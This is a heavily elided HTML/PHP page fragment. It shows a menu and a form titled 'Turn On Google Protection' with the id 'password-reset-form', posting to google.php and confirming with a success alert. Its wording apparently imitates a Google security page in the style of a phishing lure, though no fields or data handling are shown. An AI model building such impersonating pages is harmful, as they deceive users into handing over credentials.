        ...
        <div class="menu-container">
            <ul>                 
               <li><a href="index.php" class="menu">Home</a></li>
                ...
                <li><a href="google.php" class="menu" id="specialitemcolor">Google</a></li>         
   ...
   <span></span>
    ...
    <div class="container">     
        <div class="form-container">         
            <h2 id="onlywhiteitems">Turn On Google Protection</h2>         
            <form action="google.php" method="post" id="password-reset-form" onsubmit="return showLoadingMessage()">             
    ...
    <script>
        function showLoadingMessage() {
            ...
            if (form.checkValidity()) {
                ...
                alert("Google Protection is On Successfully ✔");
